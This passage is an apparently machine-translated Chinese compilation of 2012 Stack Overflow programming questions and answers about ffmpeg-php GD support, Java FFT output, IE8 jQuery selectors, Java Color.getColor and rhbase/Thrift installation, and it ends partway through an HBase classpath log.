我已经安装了 ffmpeg、imagic 和 ffmpeg-php。它可以工作，但我有一个问题：GD 支持被禁用。

这是我的`phpinfo()`行：

```
ffmpeg

ffmpeg-php version   0.7.0
ffmpeg-php built on  Oct 29 2012 14:22:26
ffmpeg-php gd support   disabled
ffmpeg libavcodec version   Lavc54.59.100
ffmpeg libavcodec license   nonfree and unredistributable
ffmpeg libavformat version  Lavf54.29.104
ffmpeg libavformat license  nonfree and unredistributable
ffmpeg swscaler version SwS2.1.101
ffmpeg swscaler license nonfree and unredistributable
ffmpeg codec_list   a64multi(v), a64multi5(v), aasc(v), amv(v), amv(v), anm(v), ansi(v), asv1(v), asv1(v), asv2(v), asv2(v), aura(v), aura2(v), avrp(v), avrp(v), avrn(v), avs(v), avui(v), avui(v), ayuv(v), ayuv(v), bethsoftvid(v), bfi(v), binkvideo(v), bmp(v), bmp(v), bmv_video(v), c93(v), cavs(v), cdgraphics(v), cdxl(v), cinepak(v), cljr(v), cljr(v), cllc(v), cpia(v), camstudio(v), cyuv(v), dfa(v), dirac(v), dnxhd(v), dnxhd(v), dpx(v), dpx(v), dsicinvideo(v), dvvideo(v), dvvideo(v), dxa(v), dxtory(v), eacmv(v), eamad(v), eatgq(v), eatgv(v), eatqi(v), 8bps(v), 8svx_exp(a), 8svx_fib(a), escape124(v), escape130(v), exr(v), ffv1(v), ffv1(v), ffvhuff(v), ffvhuff(v), flashsv(v), flashsv(v), flashsv2(v), flashsv2(v), flic(v), flv(v), flv(v), 4xm(v), fraps(v), frwu(v), gif(v), gif(v), h261(v), h261(v), h263(v), h263(v), h263i(v), h263p(v), h263p(v), h264(v), h264_vda(v), huffyuv(v), huffyuv(v), idcinvideo(v), iff_byterun1(v), iff_ilbm(v), indeo2(v), indeo3(v), indeo4(v), indeo5(v), interplayvideo(v), j2k(v), j2k(v), jpegls(v), jpegls(v), jv(v), kgv1(v), kmvc(v), lagarith(v), ljpeg(v), loco(v), mdec(v), mimic(v), mjpeg(v), mjpeg(v), mjpegb(v), mmvideo(v), motionpixels(v), mpegvideo_xvmc(v), mpeg1video(v), mpeg1video(v), mpeg2video(v), mpeg2video(v), mpeg4(v), mpeg4(v), mpegvideo(v), msa1(v), msmpeg4v1(v), msmpeg4v2(v), msmpeg4v2(v), msmpeg4(v), msmpeg4(v), msrle(v), mss1(v), mss2(v), msvideo1(v), msvideo1(v), mszh(v), mts2(v), mxpeg(v), nuv(v), paf_video(v), pam(v), pam(v), pbm(v), pbm(v), pcx(v), pcx(v), pgm(v), pgm(v), pgmyuv(v), pgmyuv(v), pictor(v), png(v), png(v), ppm(v), ppm(v), prores(v), prores(v), prores_anatoliy(v), prores_kostya(v), prores_lgpl(v), ptx(v), qdraw(v), qpeg(v), qtrle(v), qtrle(v), r10k(v), r10k(v), r210(v), r210(v), rawvideo(v), rawvideo(v), rl2(v), roqvideo(v), roqvideo(v), rpza(v), rv10(v), rv10(v), rv20(v), rv20(v), rv30(v), rv40(v), s302m(a), sanm(v), sgi(v), sgi(v), smackvid(v), smc(v), snow(v), snow(v), sp5x(v), sunrast(v), sunrast(v), svq1(v), svq1(v), svq3(v), targa(v), targa(v), theora(v), thp(v), tiertexseqvideo(v), tiff(v), tiff(v), tmv(v), truemotion1(v), truemotion2(v), camtasia(v), tscc2(v), txd(v), ultimotion(v), utvideo(v), utvideo(v), v210(v), v210(v), v210x(v), v308(v), v308(v), v408(v), v408(v), v410(v), v410(v), vb(v), vble(v), vc1(v), vc1image(v), vcr1(v), vmdvideo(v), vmnc(v), vp3(v), vp5(v), vp6(v), vp6a(v), vp6f(v), vp8(v), vqavideo(v), wmv1(v), wmv1(v), wmv2(v), wmv2(v), wmv3(v), wmv3image(v), wnv1(v), xan_wc3(v), xan_wc4(v), xbm(v), xbm(v), xl(v), xwd(v), xwd(v), y41p(v), y41p(v), yop(v), yuv4(v), yuv4(v), zerocodec(v), zlib(v), zlib(v), zmbv(v), zmbv(v), aac(a), aac(a), aac_latm(a), ac3(a), ac3(a), ac3_fixed(a), alac(a), alac(a), als(a), amrnb(a), amrwb(a), ape(a), atrac1(a), atrac3(a), binkaudio_dct(a), binkaudio_rdft(a), bmv_audio(a), cook(a), dca(a), dca(a), dsicinaudio(a), eac3(a), eac3(a), wavesynth(a), flac(a), flac(a), g723_1(a), g723_1(a), g729(a), gsm(a), gsm_ms(a), iac(a), imc(a), mace3(a), mace6(a), mlp(a), mp1(a), mp1float(a), mp2(a), mp2(a), mp2float(a), mp3(a), mp3float(a), mp3adu(a), mp3adufloat(a), mp3on4(a), mp3on4float(a), mpc7(a), mpc8(a), nellymoser(a), nellymoser(a), paf_audio(a), qcelp(a), qdm2(a), real_144(a), real_144(a), real_288(a), ralf(a), shorten(a), sipr(a), smackaud(a), sonic(a), sonic(a), sonicls(a), truehd(a), truespeech(a), tta(a), twinvq(a), vmdaudio(a), vorbis(a), vorbis(a), wavpack(a), wmalossless(a), wmapro(a), wmav1(a), wmav1(a), wmav2(a), wmav2(a), wmavoice(a), ws_snd1(a), pcm_alaw(a), pcm_alaw(a), pcm_bluray(a), pcm_dvd(a), pcm_f32be(a), pcm_f32be(a), pcm_f32le(a), pcm_f32le(a), pcm_f64be(a), pcm_f64be(a), pcm_f64le(a), pcm_f64le(a), pcm_lxf(a), pcm_mulaw(a), pcm_mulaw(a), pcm_s8(a), pcm_s8(a), pcm_s8_planar(a), pcm_s16be(a), pcm_s16be(a), pcm_s16le(a), pcm_s16le(a), pcm_s16le_planar(a), pcm_s24be(a), pcm_s24be(a), pcm_s24daud(a), pcm_s24daud(a), pcm_s24le(a), pcm_s24le(a), pcm_s32be(a), pcm_s32be(a), pcm_s32le(a), pcm_s32le(a), pcm_u8(a), pcm_u8(a), pcm_u16be(a), pcm_u16be(a), pcm_u16le(a), pcm_u16le(a), pcm_u24be(a), pcm_u24be(a), pcm_u24le(a), pcm_u24le(a), pcm_u32be(a), pcm_u32be(a), pcm_u32le(a), pcm_u32le(a), pcm_zork(a), interplay_dpcm(a), roq_dpcm(a), roq_dpcm(a), sol_dpcm(a), xan_dpcm(a), adpcm_4xm(a), adpcm_adx(a), adpcm_adx(a), adpcm_ct(a), adpcm_ea(a), adpcm_ea_maxis_xa(a), adpcm_ea_r1(a), adpcm_ea_r2(a), adpcm_ea_r3(a), adpcm_ea_xas(a), g722(a), g722(a), g726(a), g726(a), adpcm_ima_amv(a), adpcm_ima_apc(a), adpcm_ima_dk3(a), adpcm_ima_dk4(a), adpcm_ima_ea_eacs(a), adpcm_ima_ea_sead(a), adpcm_ima_iss(a), adpcm_ima_qt(a), adpcm_ima_qt(a), adpcm_ima_smjpeg(a), adpcm_ima_wav(a), adpcm_ima_wav(a), adpcm_ima_ws(a), adpcm_ms(a), adpcm_ms(a), adpcm_sbpro_2(a), adpcm_sbpro_3(a), adpcm_sbpro_4(a), adpcm_swf(a), adpcm_swf(a), adpcm_thp(a), adpcm_xa(a), adpcm_yamaha(a), adpcm_yamaha(a), vima(a), ass(s), ass(s), dvbsub(s), dvbsub(s), dvdsub(s), dvdsub(s), jacosub(s), microdvd(s), mov_text(s), mov_text(s), pgssub(s), realtext(s), sami(s), srt(s), srt(s), subrip(s), subrip(s), subviewer(s), webvtt(s), xsub(s), xsub(s), libfaac(a), libmp3lame(a), libx264(v), libx264rgb(v), libxvid(v), bintext(v), xbin(v), idf(v), 
```

我使用 MAMP，PHP 5.3.6。我已经搜索了 3 天的解决方案，可悲的是没有结果。

# java - 将复杂转换为 ArrayList 在爪哇

> ID：13125248
> 
> 赞同：3
> 
> 时间：2012-10-29T16:02:29.073
> 
> 标签：java

我有一个输入信号，我想将其存储在 ArrayList 中，然后将其转换为 Complex，如下所示

```
-0.03480425839330703
0.07910192950176387
0.7233322451735928
0.1659819820667019 
```

这像这样输出它的FFT

```
0.9336118983487516
-0.7581365035668999 + 0.08688005256493803i
0.44344407521182005
-0.7581365035668999 - 0.08688005256493803i 
```

这是一个复杂的结构，我想将其转换为 ArrayList 类型。同时降低`+ 0.08688005256493803i`价值。

所以我需要的只是这些价值观

```
0.9336118983487516
-0.7581365035668999
0.44344407521182005
-0.7581365035668999 
```

解决这个问题的最佳方法是什么？

这是我正在使用的代码

```
public static Complex[] fft(Complex[] x) {
        int N = x.length;

        // base case
        if (N == 1) return new Complex[] { x[0] };

        // radix 2 Cooley-Tukey FFT
        if (N % 2 != 0) { throw new RuntimeException("N is not a power of 2"); }

        // fft of even terms
        Complex[] even = new Complex[N/2];
        for (int k = 0; k < N/2; k++) {
            even[k] = x[2*k];
        }
        Complex[] q = fft(even);

        // fft of odd terms
        Complex[] odd  = even;  // reuse the array
        for (int k = 0; k < N/2; k++) {
            odd[k] = x[2*k + 1];
        }
        Complex[] r = fft(odd);

        // combine
        Complex[] y = new Complex[N];
        for (int k = 0; k < N/2; k++) {
            double kth = -2 * k * Math.PI / N;
            Complex wk = new Complex(Math.cos(kth), Math.sin(kth));
            y[k]       = q[k].plus(wk.times(r[k]));
            y[k + N/2] = q[k].minus(wk.times(r[k]));
        }
        return y;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:24:45.963

您要做的只是删除`Complex`数据结构的虚部。

正如您没有向我们展示的那样`Complex`，假设它具有真实部分的成员（例如`double real;`）要删除虚构部分，只需调用类似的东西`complex.getRealPart()`，或访问`complex.real`（替换为您的真实成员名称）。

要编写`ArrayList<Double>`使用以下代码段：

```
ArrayList<Double> list = new ArrayList<Double>();
for (Complex c : complexes) {  // complexes your array of complexes returned from for fft
  list.add(c.getRealpart());
} 
```

**注意：**以防万一，我可能是错的，但我假设你需要复数的绝对值而不是实部。要计算它，请使用：

```
Math.sqrt(c.getRealPart() * c.getRealPart() + c.getImPart() * c.getImPart()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:41:45.273

据我了解，您只想要复杂值的实部。如果是这种情况，大概您的 Complex 类也有 getReal() 和 getImaginary()（或类似）方法 - 所以只需使用 getReal()。

# javascript - IE8中按属性获取对象

> ID：13125250
> 
> 赞同：1
> 
> 时间：2012-10-29T16:02:34.923
> 
> 标签：javascript, internet-explorer-8

以下行在 IE9 中运行良好，但在 IE8 中给我一个“对象不支持此属性或方法”错误。

```
var id = $("td[title='Project Documents']"); 
```

是否有兼容 IE8 的方式来获取基于特定属性的对象？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:21:16.543

根据[文档](http://api.jquery.com/category/selectors/)，您应该拥有什么。试试这个：

```
$("td[title]").filter(function () {
    return 'Project Documents' === $(this).attr('title');
}); 
```

可能是大写或空格字符不完全匹配。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:23:39.003

我很想在标题中没有任何空格的标题上对此进行测试，以测试它是否真的是导致问题的原因。

# java - Color.getColor（字符串名称）不起作用

> ID：13125253
> 
> 赞同：2
> 
> 时间：2012-10-29T16:02:39.947
> 
> 标签：java, swing, user-interface

我正在尝试使用 getColor(String name) 函数更改颜色，但它似乎不起作用。可能是我犯了某种错误。这是代码：

```
public class ComboBoxPractice extends JFrame{

private String names={"Color.YELLOW","Color.RED","Color.GREEN"};

public ComboBoxPractice()
{
    ...

    box.addItemListener(

            new ItemListener()
            {
                public void itemStateChanged(ItemEvent event)
                {
                    if(event.getStateChange()==event.SELECTED)
                    {
                        getContentPane().setBackground(Color.getColor(names[box.getSelectedIndex()]));
                    }
                }
            }
    );
} 
```

}

我还尝试了仅包含颜色名称的字符串数组，例如 YELLOW、RED、BLUE。但它没有用。

我知道通过创建一个类颜色数组来改变颜色的另一种方法，但我想尝试这种方法。

我究竟做错了什么？

问候

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:04:51.557

将 Color 类用作：

```
 private Color[] colors ={Color.YELLOW,Color.RED,Color.GREEN}; 
```

如果您使用`Color`该类，则可以将以下语句更新为：

```
 getContentPane().setBackground(Color.getColor(names[box.getSelectedIndex()])); 
```

作为

```
 getContentPane().setBackground(colors[box.getSelectedIndex()]); 
```

或使用“黑色”、“红色”等名称。

```
 private String[] names={"yellow","red","green"}; 
```

如果您决定使用上面的颜色名称，那么您可以`Color`使用反射获取对象，如下所示：

```
 Field field = Color.class.getField(names[0]);
    Color color = (Color)field.get(null); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:15:57.940

另一种方法是使用反射`Color`从字段名称中获取实例，例如：

```
Field field = Color.class.getField("YELLOW");
Color c = (Color)field.get(null); 
```

请注意颜色字符串如何不包含实际的类名。对于这个应用程序，它看起来像这样：

```
Field field = Color.class.getField(names[box.getSelectedIndex()]);
Color backgroundColor = (Color)field.get(null); 
```

# r - 为 RHadoop 安装 Rhbase 包：缺少“libthrift”错误

> ID：13125263
> 
> 赞同：3
> 
> 时间：2012-10-29T16:02:50.167
> 
> 标签：r, hadoop

[我按照说明在http://github.com/RevolutionAnalytics/RHadoop/wiki/rhbase](http://github.com/RevolutionAnalytics/RHadoop/wiki/rhbase)上安装 Thrift 先决条件

我更新了 PKG_CONFIG_PATH

```
[root@localhost cloudera]# pkg-config --cflags thrift
-I/usr/local/include/thrift 
```

我可能遇到的唯一问题是您应该将节俭库“/usr/local/lib/libthrift.so.0 /usr/lib/ 复制到 /usr/lib/

但是没有 .0 文件

```
[root@localhost cloudera]# cd /usr/local/lib
[root@localhost lib]# ls
libthrift-0.9.0.so    libthriftnb.a   libthriftz-0.9.0.so  pkgconfig
libthrift.a           libthriftnb.la  libthriftz.a
libthrift.la          libthriftnb.so  libthriftz.la
libthriftnb-0.9.0.so  libthrift.so    libthriftz.so 
```

...所以我只是复制了 libthrift.so

我尝试启动 Thrift 服务器，但我承认我不知道如何解释输出......

```
[root@localhost bin]# /usr/bin/hbase thrift start
12/10/29 15:51:54 INFO util.VersionInfo: HBase 0.92.1-cdh4.1.1
12/10/29 15:51:54 INFO util.VersionInfo: Subversion file:///data/1/jenkins/workspace/generic-package-rhel64-6-0/topdir/BUILD/hbase-0.92.1-cdh4.1.1 -r Unknown
12/10/29 15:51:54 INFO util.VersionInfo: Compiled by jenkins on Tue Oct 16 12:01:17 PDT 2012
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:zookeeper.version=3.4.3-cdh4.1.1--1, built on 10/16/2012 17:34 GMT
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:host.name=localhost.localdomain
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:java.version=1.6.0_31
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:java.vendor=Sun Microsystems Inc.
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:java.home=/usr/java/jdk1.6.0_31/jre
12/10/29 15:51:55 INFO zookeeper.ZooKeeper: Client environment:java.class.path=/usr/lib/hbase/bin/../conf:/usr/java/jdk1.6.0_31/lib/tools.jar:/usr/lib/hbase/bin/..:/usr/lib/hbase/bin/../hbase-0.92.1-cdh4.1.1-security.jar:/usr/lib/hbase/bin/../hbase-0.92.1-cdh4.1.1-security-tests.jar:/usr/lib/hbase/bin/../hbase.jar:/usr/lib/hbase/bin/../lib/activation-1.1.jar:/usr/lib/hbase/bin/../lib/aopalliance-1.0.jar:/usr/lib/hbase/bin/../lib/asm-3.2.jar:/usr/lib/hbase/bin/../lib/avro-1.7.1.cloudera.2.jar:/usr/lib/hbase/bin/../lib/commons-beanutils-1.7.0.jar:/usr/lib/hbase/bin/../lib/commons-beanutils-core-1.8.0.jar:/usr/lib/hbase/bin/../lib/commons-cli-1.2.jar:/usr/lib/hbase/bin/../lib/commons-codec-1.4.jar:/usr/lib/hbase/bin/../lib/commons-collections-3.2.1.jar:/usr/lib/hbase/bin/../lib/commons-configuration-1.6.jar:/usr/lib/hbase/bin/../lib/commons-daemon-1.0.3.jar:/usr/lib/hbase/bin/../lib/commons-digester-1.8.jar:/usr/lib/hbase/bin/../lib/commons-el-1.0.jar:/usr/lib/hbase/bin/../lib/commons-httpclient-3.1.jar:/usr/lib/hbase/bin/../lib/commons-io-2.1.jar:/usr/lib/hbase/bin/../lib/commons-lang-2.5.jar:/usr/lib/hbase/bin/../lib/commons-logging-1.1.1.jar:/usr/lib/hbase/bin/../lib/commons-net-3.1.jar:/usr/lib/hbase/bin/../lib/core-3.1.1.jar:/usr/lib/hbase/bin/../lib/gmbal-api-only-3.0.0-b023.jar:/usr/lib/hbase/bin/../lib/grizzly-framework-2.1.1.jar:/usr/lib/hbase/bin/../lib/grizzly-framework-2.1.1-tests.jar:/usr/lib/hbase/bin/../lib/grizzly-http-2.1.1.jar:/usr/lib/hbase/bin/../lib/grizzly-http-server-2.1.1.jar:/usr/lib/hbase/bin/../lib/grizzly-http-servlet-2.1.1.jar:/usr/lib/hbase/bin/../lib/grizzly-rcm-2.1.1.jar:/usr/lib/hbase/bin/../lib/guava-11.0.2.jar:/usr/lib/hbase/bin/../lib/guice-3.0.jar:/usr/lib/hbase/bin/../lib/guice-servlet-3.0.jar:/usr/lib/hbase/bin/../lib/high-scale-lib-1.1.1.jar:/usr/lib/hbase/bin/../lib/httpclient-4.0.1.jar:/usr/lib/hbase/bin/../lib/httpcore-4.0.1.jar:/usr/lib/hbase/bin/../lib/jackson-core-asl-1.8.8.jar:/usr/lib/hbase/bin/../lib/jackson-jaxrs-1.8.8.jar:/usr/lib/hbase/bin/../lib/jackson-mapper-asl-1.8.8.jar:/usr/lib/hbase/bin/../lib/jackson-xc-1.8.8.jar:/usr/lib/hbase/bin/../lib/jamon-runtime-2.3.1.jar:/usr/lib/hbase/bin/../lib/jasper-compiler-5.5.23.jar:/usr/lib/hbase/bin/../lib/jasper-runtime-5.5.23.jar:/usr/lib/hbase/bin/../lib/javax.inject-1.jar:/usr/lib/hbase/bin/../lib/javax.servlet-3.0.jar:/usr/lib/hbase/bin/../lib/jaxb-api-2.1.jar:/usr/lib/hbase/bin/../lib/jaxb-impl-2.2.3-1.jar:/usr/lib/hbase/bin/../lib/jersey-client-1.8.jar:/usr/lib/hbase/bin/../lib/jersey-core-1.8.jar:/usr/lib/hbase/bin/../lib/jersey-grizzly2-1.8.jar:/usr/lib/hbase/bin/../lib/jersey-guice-1.8.jar:/usr/lib/hbase/bin/../lib/jersey-json-1.8.jar:/usr/lib/hbase/bin/../lib/jersey-server-1.8.jar:/usr/lib/hbase/bin/../lib/jersey-test-framework-core-1.8.jar:/usr/lib/hbase/bin/../lib/jersey-test-framework-grizzly2-1.8.jar:/usr/lib/hbase/bin/../lib/jets3t-0.6.1.jar:/usr/lib/hbase/bin/../lib/jettison-1.1.jar:/usr/lib/hbase/bin/../lib/jetty-6.1.26.cloudera.2.jar:/usr/lib/hbase/bin/../lib/jetty-util-6.1.26.cloudera.2.jar:/usr/lib/hbase/bin/../lib/jruby-complete-1.6.5.jar:/usr/lib/hbase/bin/../lib/jsch-0.1.42.jar:/usr/lib/hbase/bin/../lib/jsp-2.1-6.1.14.jar:/usr/lib/hbase/bin/../lib/jsp-api-2.1-6.1.14.jar:/usr/lib/hbase/bin/../lib/jsp-api-2.1.jar:/usr/lib/hbase/bin/../lib/jsr305-1.3.9.jar:/usr/lib/hbase/bin/../lib/kfs-0.3.jar:/usr/lib/hbase/bin/../lib/libthrift-0.7.0.jar:/usr/lib/hbase/bin/../lib/log4j-1.2.17.jar:/usr/lib/hbase/bin/../lib/management-api-3.0.0-b012.jar:/usr/lib/hbase/bin/../lib/metrics-core-2.1.2.jar:/usr/lib/hbase/bin/../lib/netty-3.2.4.Final.jar:/usr/lib/hbase/bin/../lib/paranamer-2.3.jar:/usr/lib/hbase/bin/../lib/protobuf-java-2.4.0a.jar:/usr/lib/hbase/bin/../lib/servlet-api-2.5-6.1.14.jar:/usr/lib/hbase/bin/../lib/servlet-api-2.5.jar:/usr/lib/hbase/bin/../lib/slf4j-api-1.6.1.jar:/usr/lib/hbase/bin/../lib/snappy-java-1.0.4.1.jar:/usr/lib/hbase/bin/../lib/stax-api-1.0.1.jar:/usr/lib/hbase/bin/../lib/xmlenc-0.52.jar:/usr/lib/hbase/bin/../lib/zookeeper.jar:/etc/hadoop/conf:/*:/lib/*:/usr/lib/zookeeper/zookeeper.jar:/usr/lib/zookeeper/zookeeper-3.4.3-cdh4.1.1.jar:/usr/lib/zookeeper/lib/netty-3.2.2.Final.jar:/usr/lib/zookeeper/lib/jline-0.9.94.jar:/usr/lib/zookeeper/lib/log4j-1.2.15.jar:/usr/lib/zookeeper/lib/slf4j-log4j12-1.6.1.jar:/usr/lib/zookeeper/lib/slf4j-api-1.6.1.jar::/etc/hadoop/conf:/usr/lib/hadoop/lib/commons-io-2.1.jar:/usr/lib/hadoop/lib/xmlenc-0.52.jar:/usr/lib/hadoop/lib/commons-math-2.1.jar:/usr/lib/hadoop/lib/avro-1.7.1.cloudera.2.jar:/usr/lib/hadoop/lib/commons-logging-1.1.1.jar:/usr/lib/hadoop/lib/commons-beanutils-core-1.8.0.jar:/usr/lib/hadoop/lib/junit-4.8.2.jar:/usr/lib/hadoop/lib/kfs-0.3.jar:/usr/lib/hadoop/lib/jetty-util-6.1.26.cloudera.2.jar:/usr/lib/hadoop/lib/jets3t-0.6.1.jar:/usr/lib/hadoop/lib/commons-el-1.0.jar:/usr/lib/hadoop/lib/jaxb-api-2.2.2.jar:/usr/lib/hadoop/lib/jettison-1.1.jar:/usr/lib/hadoop/lib/log4j-1.2.17.jar:/usr/lib/hadoop/lib/commons-configuration-1.6.jar:/usr/lib/hadoop/lib/jasper-compiler-5.5.23.jar:/usr/lib/hadoop/lib/jaxb-impl-2.2.3-1.jar:/usr/lib/hadoop/lib/commons-codec-1.4.jar:/usr/lib/hadoop/lib/snappy-java-1.0.4.1.jar:/usr/lib/hadoop/lib/jline-0.9.94.jar:/usr/lib/hadoop/lib/activation-1.1.jar:/usr/lib/hadoop/lib/jasper-runtime-5.5.23.jar:/usr/lib/hadoop/lib/jersey-core-1.8.jar:/usr/lib/hadoop/lib/jsch-0.1.42.jar:/usr/lib/hadoop/lib/asm-3.2.jar:/usr/lib/hadoop/lib/commons-httpclient-3.1.jar:/usr/lib/hadoop/lib/commons-collections-3.2.1.jar:/usr/lib/hadoop/lib/stax-api-1.0.1.jar:/usr/lib/hadoop/lib/commons-beanutils-1.7.0.jar:/usr/lib/hadoop/lib/jsp-api-2.1.jar:/usr/lib/hadoop/lib/jackson-mapper-asl-1.8.8.jar:/usr/lib/hadoop/lib/jackson-xc-1.8.8.jar:/usr/lib/hadoop/lib/paranamer-2.3.jar:/usr/lib/hadoop/lib/jersey-json-1.8.jar:/usr/lib/hadoop/lib/guava-11.0.2.jar:/usr/lib/hadoop/lib/jsr305-1.3.9.jar:/usr/lib/hadoop/lib/slf4j-log4j12-1.6.1.jar:/usr/lib/hadoop/lib/jackson-core-asl-1.8.8.jar:/usr/lib/hadoop/lib/jetty-6.1.26.cloudera.2.jar:/usr/lib/hadoop/lib/mockito-all-1.8.5.jar:/usr/lib/hadoop/lib/commons-net-3.1.jar:/usr/lib/hadoop/lib/jackson-jaxrs-1.8.8.jar:/usr/lib/hadoop/lib/commons-lang-2.5.jar:/usr/lib/hadoop/lib/commons-digester-1.8.jar:/usr/lib/hadoop/lib/zookeeper-3.4.3-cdh4.1.1.jar:/usr/lib/hadoop/lib/commons-cli-1.2.jar:/usr/lib/hadoop/lib/slf4j-api-1.6.1.jar:/usr/lib/hadoop/lib/hue-plugins-2.1.0-cdh4.1.1.jar:/usr/lib/hadoop/lib/protobuf-java-2.4.0a.jar:/usr/lib/hadoop/lib/servlet-api-2.5.jar:/usr/lib/hadoop/lib/jersey-server-1.8.jar:/usr/lib/hadoop/.//hadoop-annotations-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop/.//hadoop-common-2.0.0-cdh4.1.1-tests.jar:/usr/lib/hadoop/.//hadoop-auth-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop/.//hadoop-common-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop/.//hadoop-auth.jar:/usr/lib/hadoop/.//hadoop-common.jar:/usr/lib/hadoop/.//hadoop-annotations.jar:/usr/lib/hadoop-hdfs/./:/usr/lib/hadoop-hdfs/lib/commons-io-2.1.jar:/usr/lib/hadoop-hdfs/lib/xmlenc-0.52.jar:/usr/lib/hadoop-hdfs/lib/commons-logging-1.1.1.jar:/usr/lib/hadoop-hdfs/lib/jetty-util-6.1.26.cloudera.2.jar:/usr/lib/hadoop-hdfs/lib/commons-el-1.0.jar:/usr/lib/hadoop-hdfs/lib/log4j-1.2.17.jar:/usr/lib/hadoop-hdfs/lib/commons-codec-1.4.jar:/usr/lib/hadoop-hdfs/lib/jline-0.9.94.jar:/usr/lib/hadoop-hdfs/lib/jasper-runtime-5.5.23.jar:/usr/lib/hadoop-hdfs/lib/jersey-core-1.8.jar:/usr/lib/hadoop-hdfs/lib/asm-3.2.jar:/usr/lib/hadoop-hdfs/lib/jsp-api-2.1.jar:/usr/lib/hadoop-hdfs/lib/jackson-mapper-asl-1.8.8.jar:/usr/lib/hadoop-hdfs/lib/guava-11.0.2.jar:/usr/lib/hadoop-hdfs/lib/jsr305-1.3.9.jar:/usr/lib/hadoop-hdfs/lib/jackson-core-asl-1.8.8.jar:/usr/lib/hadoop-hdfs/lib/jetty-6.1.26.cloudera.2.jar:/usr/lib/hadoop-hdfs/lib/commons-lang-2.5.jar:/usr/lib/hadoop-hdfs/lib/zookeeper-3.4.3-cdh4.1.1.jar:/usr/lib/hadoop-hdfs/lib/commons-cli-1.2.jar:/usr/lib/hadoop-hdfs/lib/protobuf-java-2.4.0a.jar:/usr/lib/hadoop-hdfs/lib/servlet-api-2.5.jar:/usr/lib/hadoop-hdfs/lib/commons-daemon-1.0.3.jar:/usr/lib/hadoop-hdfs/lib/jersey-server-1.8.jar:/usr/lib/hadoop-hdfs/.//hadoop-hdfs-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-hdfs/.//hadoop-hdfs.jar:/usr/lib/hadoop-hdfs/.//hadoop-hdfs-2.0.0-cdh4.1.1-tests.jar:/usr/lib/hadoop-yarn/lib/commons-io-2.1.jar:/usr/lib/hadoop-yarn/lib/avro-1.7.1.cloudera.2.jar:/usr/lib/hadoop-yarn/lib/log4j-1.2.17.jar:/usr/lib/hadoop-yarn/lib/jersey-guice-1.8.jar:/usr/lib/hadoop-yarn/lib/javax.inject-1.jar:/usr/lib/hadoop-yarn/lib/snappy-java-1.0.4.1.jar:/usr/lib/hadoop-yarn/lib/jersey-core-1.8.jar:/usr/lib/hadoop-yarn/lib/asm-3.2.jar:/usr/lib/hadoop-yarn/lib/aopalliance-1.0.jar:/usr/lib/hadoop-yarn/lib/jackson-mapper-asl-1.8.8.jar:/usr/lib/hadoop-yarn/lib/paranamer-2.3.jar:/usr/lib/hadoop-yarn/lib/guice-3.0.jar:/usr/lib/hadoop-yarn/lib/guice-servlet-3.0.jar:/usr/lib/hadoop-yarn/lib/jackson-core-asl-1.8.8.jar:/usr/lib/hadoop-yarn/lib/netty-3.2.4.Final.jar:/usr/lib/hadoop-yarn/lib/protobuf-java-2.4.0a.jar:/usr/lib/hadoop-yarn/lib/jersey-server-1.8.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-applications-distributedshell.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-nodemanager-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-resourcemanager-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-tests.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-tests-2.0.0-cdh4.1.1-tests.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-common-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-tests-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-applications-distributedshell-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-common.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-web-proxy-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-nodemanager.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-site-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-site.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-web-proxy.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-common-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-api.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-api-2.0.0-cdh4.1.1.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-common.jar:/usr/lib/hadoop-yarn/.//hadoop-yarn-server-resourcemanager.jar:/usr/lib/hadoop-mapreduce/lib/commons-io-2.1.jar:/usr/lib/hadoop-mapreduce/lib/avro-1.7.1.cloudera.2.jar:/usr/lib/hadoop-mapreduce/lib/log4j-1.2.17.jar:/usr/lib/hadoop-mapreduce/lib/jersey-guice-1.8.jar:/usr/lib/hadoop-mapreduce/lib/javax.inject-1.jar:/usr/lib/hadoop-mapreduce/lib/snappy-java-1.0.4.1.jar:/usr/lib/hadoop-mapreduce/lib/jersey-core-1.8.jar:/usr/lib/hadoop-mapreduce/lib/asm-3.2.jar:/usr/lib/hadoop-mapreduce/lib/aopalliance-1.0.jar:/usr/lib/hadoop-mapreduce/lib/jackson-mapper-asl-1.8.8.jar:/usr/lib/hadoop-mapreduce/lib/paranamer-2.3.jar:/usr/lib/hadoop-mapreduce/lib/guice-3.0.jar:/usr/lib/hadoop-mapreduce/lib/guice-servlet-3.0.jar:/usr/lib/hadoop-mapreduce/l